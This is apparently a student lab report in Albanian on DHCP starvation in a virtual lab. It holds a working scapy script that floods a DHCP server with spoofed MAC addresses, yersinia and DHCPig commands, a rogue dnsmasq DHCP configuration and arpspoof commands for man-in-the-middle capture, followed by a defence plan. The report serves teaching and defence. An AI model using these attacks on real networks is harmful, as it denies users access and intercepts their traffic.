# Sulmi DHCP Starvation — Dokumentim Detyrë Individuale

 Anxhela Boboçi  
---

## 1. Konceptet Teorike

### Çfarë është DHCP Starvation?

**DHCP Starvation** (Stërmundim i DHCP-së) është një sulm i tipit **Denial of Service (DoS)** ndaj serverit DHCP në rrjet. Sulmuesi dërgon një numër të madh kërkesash `DHCPDISCOVER` me adresa MAC të rreme (spoofed), duke shteruar të gjitha adresat IP të disponueshme në pishinën (pool) e DHCP-serverit. Si rezultat, pajisjet legjitime nuk mund të marrin adresë IP dhe nuk mund të aksesojnë rrjetin.
[Sulmuesi] →→→ DHCPDISCOVER (MAC i rremë) ×1000 →→→ [DHCP Server/Router]
↓
[Viktima] ←←← Nuk ka IP të lirë! Akses i bllokuar ←←←←←←


### Pozicionimi — MITM (Man-in-the-Middle)

Detyra kërkon pozicionim **midis router-it dhe target-it**. Kjo arrihet me:
1. **DHCP Starvation** → shter pool-in e router-it
2. **Rogue DHCP Server** → sulmuesi ngre DHCP server të rremë dhe jep IP-të e tij si gateway → **MITM automatik**

---

## 2. Mjedisi i Laboratorit

| Komponent | Detaje |
|---|---|
| **OS Sulmuesi** | Fedora Linux (`boboci@fedora`) |
| **Mjedisi Virtual** | VirtualBox me Internal Network / Host-Only Adapter |
| **Viktima (Target)** | VM e dytë — Ubuntu/Debian |
| **Router/DHCP** | VM e tretë ose router virtual (pfSense / dnsmasq) |
| **Tools** | `yersinia`, `scapy`, `dhcpig`, `iptables`, `arpspoof`, `wireshark` |

### Topologjia e Rrjetit
[Router / DHCP Server]
| 192.168.100.1
|
[Switch Virtual]
/
[Sulmuesi] [Viktima/Target]
boboci@fedora 192.168.100.x


### Instalimi i Tools

```bash
# Fedora — instalimi i paketave
sudo dnf install -y yersinia wireshark nmap python3-scapy

# Instalimi i dhcpig (tool për DHCP starvation)
sudo dnf install -y git python3-pip
git clone https://github.com/kamorin/DHCPig
cd DHCPig
sudo pip3 install scapy
```

---

## 3. Faza 1 — Recon (Zbulimi)

Para çdo sulmi, identifikohet rrjeti dhe target-i.

```bash
# Gjen interface-in aktiv
ip a

# Skanon rrjetin lokal
sudo nmap -sn 192.168.100.0/24

# Shikon DHCP lease ekzistues
cat /var/lib/dhclient/dhclient.leases

# Monitoron paketat DHCP aktive me Wireshark (CLI)
sudo tcpdump -i enp0s3 port 67 or port 68 -vvv
```

**Output:**
Starting Nmap scan...
Host: 192.168.100.1 (Router) Status: Up
Host: 192.168.100.10 (Target) Status: Up



---

## 4. Faza 2 — Sulmi DHCP Starvation

### Metoda A: me `yersinia` (GUI / Interactive)

```bash
# Hap yersinia në modalitet interaktiv
sudo yersinia -I

# Brenda yersinia:
# 1. Shtyp 'G' për të zgjedhur DHCP
# 2. Shtyp 'x' për të hapur menunë e sulmeve
# 3. Zgjidh opsionin: "sending DISCOVER packet"
# 4. Vendos interface: enp0s3
# 5. Confirm me ENTER — sulmi fillon
```

### Metoda B: me `DHCPig` (Python)

```bash
cd DHCPig
sudo python3 pig.py enp0s3
```

**Çfarë ndodh:**  
- Tool-i gjeneron automatikisht MAC adresa të rreme
- Dërgon qindra `DHCPDISCOVER` në sekondë
- Pool-i i DHCP shterot brenda sekondave

### Metoda C: me `scapy` (Script Python manual)

```python
#!/usr/bin/env python3
# dhcp_starvation.py — boboci@fedora

from scapy.all import *
import random
import time

INTERFACE = "enp0s3"

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def dhcp_starvation(interface, count=500):
    print(f"[*] Duke nisur DHCP Starvation në {interface}...")
    for i in range(count):
        mac = random_mac()
        
        dhcp_discover = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=bytes.fromhex(mac.replace(':', '')), xid=random.randint(0, 0xFFFFFFFF)) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        
        sendp(dhcp_discover, iface=interface, verbose=False)
        print(f"[+] Paketë {i+1}/{count} dërguar — MAC: {mac}")
        time.sleep(0.01)
    
    print("[!] Pool DHCP i shteruar! Target nuk mund të marrë IP.")

if __name__ == "__main__":
    dhcp_starvation(INTERFACE, count=500)
```

```bash
# Ekzekutimi
sudo python3 dhcp_starvation.py
```

### Verifikimi i Sulmit

```bash
# Nga Target VM — provon të marrë IP
sudo dhclient -v enp0s3
# Outputi: "No DHCPOFFERS received" — BLLOKUAR ✓

# Monitorim real-time
sudo tcpdump -i enp0s3 port 67 -n
```

**Rezultati:** Target-i nuk merr përgjigje DHCPOFFER — akses i bllokuar me sukses.

---

## 5. Faza 3 — MITM me Rogue DHCP (Sulm i Avancuar)

Pas shterimit të pool-it, sulmuesi ngre **DHCP Server të rremë** duke u pozicionuar midis router-it dhe target-it.

```bash
# Instalimi i dnsmasq si Rogue DHCP Server
sudo dnf install -y dnsmasq

# Konfigurimi i /etc/dnsmasq.conf
sudo nano /etc/dnsmasq.conf
```

```ini
# /etc/dnsmasq.conf — Rogue DHCP Config
interface=enp0s3
dhcp-range=192.168.100.50,192.168.100.100,12h
dhcp-option=3,192.168.100.200   # Gateway i rremë (IP e sulmuesit)
dhcp-option=6,8.8.8.8           # DNS
```

```bash
# Aktivizo IP forwarding (për MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# Vendos IP statike si "gateway"
sudo ip addr add 192.168.100.200/24 dev enp0s3

# Nis Rogue DHCP Server
sudo systemctl start dnsmasq

# Kap trafikun e target-it
sudo wireshark -i enp0s3 &
# ose tcpdump
sudo tcpdump -i enp0s3 -w /tmp/mitm_capture.pcap
```

**Rezultati:** Target-i merr IP nga sulmuesi, e trajton si gateway → I gjithë trafiku kalon nëpër sulmuesin.

---

## 6. Faza 4 — Çaktivizimi i Sulmit dhe Rikthimi i Aksesit

```bash
# Ndal sulmin (Ctrl+C në terminal ose)
sudo pkill yersinia
sudo pkill python3   # ndal script-in scapy

# Ndal Rogue DHCP
sudo systemctl stop dnsmasq

# Pastro rregullat iptables
sudo iptables -F
sudo iptables -X

# Kthe IP forwarding në OFF
sudo sysctl -w net.ipv4.ip_forward=0

# Hiq IP-në e rreme
sudo ip addr del 192.168.100.200/24 dev enp0s3

# Rikthe target-it aksesin — në VM Target
sudo dhclient -r enp0s3   # release
sudo dhclient enp0s3      # request i ri
ip a show enp0s3          # verifikimi i IP-së së re
```

**Outputi i rikthimit:**
enp0s3: inet 192.168.100.10/24 brd 192.168.100.255
— Akses i rikthyer me sukses 

text

---

## 7. Variante të Avancuara të Sulmit

### 7.1 ARP Spoofing (Alternativë MITM)

```bash
# Instalimi
sudo dnf install -y dsniff

# ARP Poisoning — pozicionim midis router-it dhe target-it
sudo arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1
# (në terminal tjetër)
sudo arpspoof -i enp0s3 -t 192.168.100.1 192.168.100.10
```

### 7.2 Kombinim DHCP Starvation + ARP Spoofing

```bash
# Hapi 1: Sher DHCP pool
sudo python3 dhcp_starvation.py

# Hapi 2: Ngre Rogue DHCP
sudo systemctl start dnsmasq

# Hapi 3: ARP Poison për target-in ekzistues
sudo arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1 &

# Hapi 4: Kap trafikun
sudo tcpdump -i enp0s3 -w /tmp/combined_attack.pcap
```

---

## 8. Plani i Mbrojtjes (Defense Plan)

### 8.1 DHCP Snooping (Mbrojtja Kryesore)

**DHCP Snooping** është mekanizmi kryesor i mbrojtjes — vetëm portet e besuara mund të dërgojnë DHCP oferta.

```bash
# Konfigurimi i DHCP Snooping në switch (Cisco IOS equivalent)
# Në mjedisin Linux — mbrojtja me iptables

# Bllo kërkesat DHCP nga pajisje të paautorizuara
sudo iptables -A INPUT -p udp --dport 67 -m mac ! --mac-source AA:BB:CC:DD:EE:FF -j DROP
# (zëvendëso me MAC-in e vërtetë të router-it)
```

### 8.2 ARP Inspection dinamike

```bash
# Instalimi i arptables
sudo dnf install -y arptables

# Lejo vetëm ARP nga adresa legjitime
sudo arptables -A INPUT --source-ip 192.168.100.1 --source-mac AA:BB:CC:DD:EE:FF -j ACCEPT
sudo arptables -A INPUT -j DROP

# Monitoro tabelën ARP për ndryshime të dyshimta
watch -n 2 'arp -n'
```

### 8.3 Static ARP Entries

```bash
# Blloko ARP Spoofing duke vendosur entry statike
sudo arp -s 192.168.100.1 AA:BB:CC:DD:EE:FF

# Bëje të përhershme në /etc/rc.local ose systemd service
echo "arp -s 192.168.100.1 AA:BB:CC:DD:EE:FF" | sudo tee -a /etc/rc.local
```

### 8.4 Rate Limiting i DHCP

```bash
# Kufizo numrin e kërkesave DHCP për sekondë nga një burim
sudo iptables -A INPUT -p udp --dport 67 -m limit --limit 10/second --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 67 -j DROP
```

### 8.5 Monitorimi me IDS (Intrusion Detection)

```bash
# Instalimi i fail2ban për mbrojtje automatike
sudo dnf install -y fail2ban

# Monitorimi me tcpdump për aktivitet të dyshimtë
sudo tcpdump -i enp0s3 'port 67 or port 68' -n | \
  awk '{print $0}' | grep -c "DISCOVER" 
# Nëse count > 50/sek — alarm!
```

### Tabela Përmbledhëse e Mbrojtjes

| Sulmi | Mbrojtja | Tool/Metoda |
|---|---|---|
| DHCP Starvation | DHCP Snooping | `iptables`, switch config |
| Rogue DHCP | Port Security | Trusted ports only |
| ARP Spoofing | Static ARP / Dynamic ARP Inspection | `arptables`, `arp -s` |
| MITM Traffic | HTTPS/TLS enkriptim | `certbot`, SSL |
| Monitoring | IDS/IPS | `fail2ban`, `tcpdump` |

---

## 9. Dëshmi dhe Evidenca

### Pamje nga Terminali (Output i pritur)
[boboci@fedora DHCPig]$ sudo python3 pig.py enp0s3
DHCP server IP not provided, using broadcast.
Sending DISCOVER from 00:1A:2B:3C:4D:5E...
Sending DISCOVER from 11:22:33:44:55:66...
[...]
[!] Pool exhausted! 254/254 leases used.
Target cannot obtain IP address — ACCESS DENIED 

text
[boboci@fedora]$ sudo tcpdump -i enp0s3 port 67
13:05:01 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request
13:05:01 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request
[... qindra kërkesa në sekondë ...]

text

---

## 10. Konkluzione
1. **Sulmin DHCP Starvation** — shterimi i pool-it me MAC adresa të rreme, duke bllokuar target-in nga aksesi
2. **Pozicionimin MITM** — nëpërmjet Rogue DHCP Server-it, trafiku i target-it ridirektua nëpër sulmuesin
3. **Kombinimin e sulmeve** — DHCP Starvation + ARP Spoofing për sulm më të fuqishëm
4. **Rikthimin e aksesit** — pas ndalesës së sulmit dhe restart-it të DHCP klientit
5. **Planin e mbrojtjes** — DHCP Snooping, ARP statike, Rate Limiting dhe monitorim aktiv

